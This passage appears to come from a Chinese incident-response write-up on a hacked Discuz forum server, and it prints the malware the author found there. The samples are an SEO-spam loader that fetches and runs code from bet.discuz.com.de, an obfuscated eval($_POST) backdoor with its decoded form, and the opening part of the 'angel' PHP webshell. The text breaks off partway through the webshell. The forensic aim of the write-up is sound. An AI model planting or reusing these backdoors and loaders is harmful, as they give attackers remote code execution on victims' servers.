<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">dec0de</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fileDir</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data</span>){
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dataArr</span> = explode(<span style="color: #8abeb7;">':'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">Keys</span> = explode(<span style="color: #8abeb7;">':'</span>,base64_decode(str_rot13(pack(<span style="color: #8abeb7;">'H*'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dataArr</span>[0]))));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">News</span> = explode(<span style="color: #8abeb7;">':'</span>,base64_decode(str_rot13(pack(<span style="color: #8abeb7;">'H*'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dataArr</span>[1]))));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">Links</span>= explode(<span style="color: #8abeb7;">':'</span>,base64_decode(str_rot13(pack(<span style="color: #8abeb7;">'H*'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dataArr</span>[2]))));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">@include</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fileDir</span>.<span style="color: #8abeb7;">'.Wh0AmI.MODEL'</span>);<span style="color: #b5bd68;">die</span>;
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">getdata</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data_url</span>){
<span style="color: #b5bd68;">if</span> (function_exists(<span style="color: #8abeb7;">'curl_exec'</span>)) {
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sp_curl</span> = @curl_init();
curl_setopt(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sp_curl</span>, <span style="color: #81a2be;">CURLOPT_URL</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data_url</span>);
curl_setopt(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sp_curl</span>, <span style="color: #81a2be;">CURLOPT_HEADER</span>, 0);
curl_setopt(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sp_curl</span>, <span style="color: #81a2be;">CURLOPT_CONNECTTIMEOUT</span>, 5);
curl_setopt(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sp_curl</span>, <span style="color: #81a2be;">CURLOPT_RETURNTRANSFER</span>, 1);
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">contents</span> = @curl_exec(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sp_curl</span>);
@curl_close(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sp_curl</span>);
}<span style="color: #b5bd68;">elseif</span>(function_exists(<span style="color: #8abeb7;">'stream_context_create'</span>)) {
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sp_cont</span> = <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'http'</span> =&gt; <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'method'</span> =&gt; <span style="color: #8abeb7;">'GET'</span>,<span style="color: #8abeb7;">'timeout'</span> =&gt; 5));
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sp_stre</span> = @stream_context_create(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sp_cont</span>);
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">contents</span> = @file_get_contents(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data_url</span>, <span style="color: #81a2be;">false</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sp_stre</span>);
}<span style="color: #b5bd68;">else</span>{
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">handle</span> = <span style="color: #81a2be;">@fopen</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data_url</span>, <span style="color: #8abeb7;">"rb"</span>);<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">contents</span> = @stream_get_contents(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">handle</span>);<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #81a2be;">@fclose</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">handle</span>);
}
<span style="color: #b5bd68;">return</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">contents</span>;
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">show</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fileDir</span>){
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filename</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fileDir</span>.md5(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">'HTTP_HOST'</span>].<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">'REQUEST_URI'</span>]);
<span style="color: #b5bd68;">if</span>(is_file(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filename</span>)){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>=<span style="color: #81a2be;">@fopen</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filename</span>,<span style="color: #8abeb7;">'r'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data</span>=<span style="color: #81a2be;">@fread</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>,filesize(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filename</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">@fclose</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #b5bd68;">empty</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data</span>)) {<span style="color: #81a2be;">@unlink</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filename</span>);<span style="color: #b5bd68;">return</span>;}
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   dec0de(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fileDir</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data</span>);
} <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data</span>=getdata(<span style="color: #8abeb7;">'http://bet.discuz.com.de/w0shiOo7.php?HOST='</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">'HTTP_H</span><span style="color: #8abeb7; text-decoration: underline;">OST'</span><span style="text-decoration: underline;">]);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>=<span style="color: #81a2be;">@fopen</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filename</span>,<span style="color: #8abeb7;">'w'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">@fwrite</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">@fclose</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(strlen(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data</span>) &gt; 1000) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   dec0de(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fileDir</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
}}
<span style="color: #b5bd68;">if</span>(<span style="color: #81a2be;">!</span>in_array(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">IP</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">KIP</span>)){
<span style="color: #b5bd68;">foreach</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">KBot</span> <span style="color: #b5bd68;">as</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">KBots</span>){<span style="color: #b5bd68;">if</span>(stristr(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">Bot</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">KBots</span>)){
show(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fileDir</span>);
}}<span style="color: #b5bd68;">foreach</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">Key</span> <span style="color: #b5bd68;">as</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">Keys</span>){
<span style="color: #b5bd68;">if</span>(stristr(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">Ref</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">Keys</span>)){
<span style="color: #b5bd68;">echo</span> <span style="color: #8abeb7;">"&lt;div style='display:none'&gt;&lt;script language='javascript' src='http://count3</span><span style="color: #8abeb7; text-decoration: underline;">1.51yes.com/click.aspx?id=310940343&amp;logo=1' charset='gb2312'&gt;&lt;/script&gt;&lt;/div&gt;&lt;script type='text/javascript' src='http://api.discuz.com.de/Seo.js'&gt;&lt;/script&gt;"</span><span style="text-decoration: underline;">;}}}</span>
</pre>
</div>
</li>
</ul>

<p>
上面代码的目的就是下载恶意代码并执行。  
</p>
</div>
</div>

<div id="outline-container-sec-4" class="outline-2">
<h2 id="sec-4">继续排查</h2>
<div class="outline-text-2" id="text-4">
<p>
通过比较svn中的代码与现网的代码还发现了一个新的后门程序
</p>

<ul class="org-ul">
<li><code>uc_client/control/class.php</code>

<div class="org-src-container">

<pre class="src src-php"><span style="color: #b294bb;">&lt;?php</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mt</span>=<span style="color: #8abeb7;">"mFsKCleRfU"</span>; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">ojj</span>=<span style="color: #8abeb7;">"IEBleldle"</span>; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">hsa</span>=<span style="color: #8abeb7;">"E9TVFsnd2VuJ10p"</span>; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fnx</span>=<span style="color: #8abeb7;">"Ow=="</span>; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674; text-decoration: underline;">zk</span><span style="text-decoration: underline;"> = str_replace(</span><span style="color: #8abeb7; text-decoration: underline;">"d"</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">""</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">"sdtdrd_redpdldadcde"</span><span style="text-decoration: underline;">); </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">ef</span><span style="text-decoration: underline;"> = </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">zk</span><span style="text-decoration: underline;">(</span><span style="color: #8abeb7; text-decoration: underline;">"z"</span><span style="text-decoration: underline;">, </span><span style="color: #8abeb7; text-decoration: underline;">""</span><span style="text-decoration: underline;">, </span><span style="color: #8abeb7; text-decoration: underline;">"zbazsze64_zdzeczodze"</span><span style="text-decoration: underline;">); </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">dva</span><span style="text-decoration: underline;"> = </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">zk</span><span style="text-decoration: underline;">(</span><span style="color: #8abeb7; text-decoration: underline;">"p"</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">""</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">"pcprpepaptpe_fpupnpcptpipopn"</span><span style="text-decoration: underline;">); </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">zvm</span><span style="text-decoration: underline;"> = </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">dva</span><span style="text-decoration: underline;">(</span><span style="color: #8abeb7; text-decoration: underline;">''</span><span style="text-decoration: underline;">, </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">ef</span><span style="text-decoration: underline;">(</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">zk</span><span style="text-decoration: underline;">(</span><span style="color: #8abeb7; text-decoration: underline;">"le"</span><span style="text-decoration: underline;">, </span><span style="color: #8abeb7; text-decoration: underline;">""</span><span style="text-decoration: underline;">, </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">ojj</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">mt</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">hsa</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">fnx</span><span style="text-decoration: underline;">))); </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">zvm</span><span style="text-decoration: underline;">(); </span><span style="color: #b294bb; text-decoration: underline;">?&gt;</span>
</pre>
</div>

<p>
解码后的结果
</p>

<div class="org-src-container">

<pre class="src src-php"><span style="color: #81a2be;">@eval</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_POST</span>[<span style="color: #8abeb7;">'wen'</span>]);
</pre>
</div>

<p>
上面的脚本可以注入任意的代码。
</p>
</li>

<li><code>./uc_server/data/tmp/angel.php</code>

<div class="org-src-container">

<pre class="src src-php"><span style="color: #b294bb;">&lt;?php</span>
error_reporting(7);
@set_magic_quotes_runtime(0);
ob_start();
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mtime</span> = explode(<span style="color: #8abeb7;">' '</span>, microtime());
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">starttime</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mtime</span>[1] + <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mtime</span>[0];
define(<span style="color: #8abeb7;">'SA_ROOT'</span>, str_replace(<span style="color: #8abeb7;">'\\'</span>, <span style="color: #8abeb7;">'/'</span>, dirname(<span style="color: #81a2be;">__FILE__</span>)).<span style="color: #8abeb7;">'/'</span>);
define(<span style="color: #8abeb7;">'IS_WIN'</span>, <span style="color: #81a2be;">DIRECTORY_SEPARATOR</span> == <span style="color: #8abeb7;">'\\'</span>);
define(<span style="color: #8abeb7;">'IS_COM'</span>, class_exists(<span style="color: #8abeb7;">'COM'</span>) ? 1 : 0 );
define(<span style="color: #8abeb7;">'IS_GPC'</span>, get_magic_quotes_gpc());
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dis_func</span> = get_cfg_var(<span style="color: #8abeb7;">'disable_functions'</span>);
define(<span style="color: #8abeb7;">'IS_PHPINFO'</span>, (<span style="color: #81a2be;">!</span>eregi(<span style="color: #8abeb7;">"phpinfo"</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dis_func</span>)) ? 1 : 0 );
@set_time_limit(0);@preg_replace(<span style="color: #8abeb7;">"/[email]/e"</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_POST</span>[<span style="color: #8abeb7;">'Id'</span>],<span style="color: #8abeb7;">"error"</span>);

<span style="color: #b5bd68;">foreach</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_POST</span> <span style="color: #b5bd68;">as</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">key</span> =&gt; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">value</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">IS_GPC</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">value</span> = s_array(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">value</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span>$<span style="color: #f0c674;">key</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">value</span>;
}
<span style="color: #969896; font-style: italic;">/*</span><span style="color: #969896; font-style: italic;">===================== &#31243;&#24207;&#37197;&#32622; =====================*/</span>

<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">echo encode_pass('angel');exit;</span>
<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">angel = ec38fe2a8497e0a8d6d349b3533038cb</span>
<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#22914;&#26524;&#38656;&#35201;&#23494;&#30721;&#39564;&#35777;,&#35831;&#20462;&#25913;&#30331;&#38470;&#23494;&#30721;,&#30041;&#31354;&#20026;&#19981;&#38656;&#35201;&#39564;&#35777;</span>
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pass</span>  = <span style="color: #8abeb7;">'ec38fe2a8497e0a8d6d349b3533038cb'</span>; <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">angel</span>

<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#22914;&#24744;&#23545; cookie &#20316;&#29992;&#33539;&#22260;&#26377;&#29305;&#27530;&#35201;&#27714;, &#25110;&#30331;&#24405;&#19981;&#27491;&#24120;, &#35831;&#20462;&#25913;&#19979;&#38754;&#21464;&#37327;, &#21542;&#21017;&#35831;&#20445;&#25345;&#40664;&#35748;</span>
<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">cookie &#21069;&#32512;</span>
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">cookiepre</span> = <span style="color: #8abeb7;">''</span>;
<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">cookie &#20316;&#29992;&#22495;</span>
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">cookiedomain</span> = <span style="color: #8abeb7;">''</span>;
<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">cookie &#20316;&#29992;&#36335;&#24452;</span>
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">cookiepath</span> = <span style="color: #8abeb7;">'/'</span>;
<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">cookie &#26377;&#25928;&#26399;</span>
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">cookielife</span> = 86400;

<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#31243;&#24207;&#25628;&#32034;&#21487;&#20889;&#25991;&#20214;&#30340;&#31867;&#22411;</span>
<span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">writabledb</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">writabledb</span> = <span style="color: #8abeb7;">'php,cgi,pl,asp,inc,js,html,htm,jsp'</span>;
<span style="color: #969896; font-style: italic;">/*</span><span style="color: #969896; font-style: italic;">===================== &#37197;&#32622;&#32467;&#26463; =====================*/</span>

<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">charsetdb</span> = <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">''</span>,<span style="color: #8abeb7;">'armscii8'</span>,<span style="color: #8abeb7;">'ascii'</span>,<span style="color: #8abeb7;">'big5'</span>,<span style="color: #8abeb7;">'binary'</span>,<span style="color: #8abeb7;">'cp1250'</span>,<span style="color: #8abeb7;">'cp1251'</span>,<span style="color: #8abeb7;">'cp12</span><span style="color: #8abeb7; text-decoration: underline;">56'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'cp1257'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'cp850'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'cp852'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'cp866'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'cp932'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'dec8'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'euc-jp'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'euc-kr'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'gb2312'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'gbk'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'geostd8'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'greek'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'hebrew'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'hp8'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'keybcs2'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'koi8r'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'koi8u'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'latin1'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'latin2'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'latin5'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'latin7'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'macce'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'macroman'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'sjis'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'swe7'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'tis620'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'ucs2'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'ujis'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'utf8'</span><span style="text-decoration: underline;">);</span>
<span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">charset</span> == <span style="color: #8abeb7;">'utf8'</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   header(<span style="color: #8abeb7;">"content-Type: text/html; charset=utf-8"</span>);
} <span style="color: #b5bd68;">elseif</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">charset</span> == <span style="color: #8abeb7;">'big5'</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   header(<span style="color: #8abeb7;">"content-Type: text/html; charset=big5"</span>);
} <span style="color: #b5bd68;">elseif</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">charset</span> == <span style="color: #8abeb7;">'gbk'</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   header(<span style="color: #8abeb7;">"content-Type: text/html; charset=gbk"</span>);
} <span style="color: #b5bd68;">elseif</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">charset</span> == <span style="color: #8abeb7;">'latin1'</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   header(<span style="color: #8abeb7;">"content-Type: text/html; charset=iso-8859-2"</span>);
} <span style="color: #b5bd68;">elseif</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">charset</span> == <span style="color: #8abeb7;">'euc-kr'</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   header(<span style="color: #8abeb7;">"content-Type: text/html; charset=euc-kr"</span>);
} <span style="color: #b5bd68;">elseif</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">charset</span> == <span style="color: #8abeb7;">'euc-jp'</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   header(<span style="color: #8abeb7;">"content-Type: text/html; charset=euc-jp"</span>);
}

<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">self</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">'PHP_SELF'</span>] ? <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">'PHP_SELF'</span>] : <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">'SCRIPT_NAME'</span>];
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">timestamp</span> = time();

<span style="color: #969896; font-style: italic;">/*</span><span style="color: #969896; font-style: italic;">===================== &#36523;&#20221;&#39564;&#35777; =====================*/</span>
<span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">action</span> == <span style="color: #8abeb7;">"logout"</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   scookie(<span style="color: #8abeb7;">'loginpass'</span>, <span style="color: #8abeb7;">''</span>, -86400 * 365);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">@header</span>(<span style="color: #8abeb7;">'Location: '</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">self</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">exit</span>;
}
<span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pass</span>) {
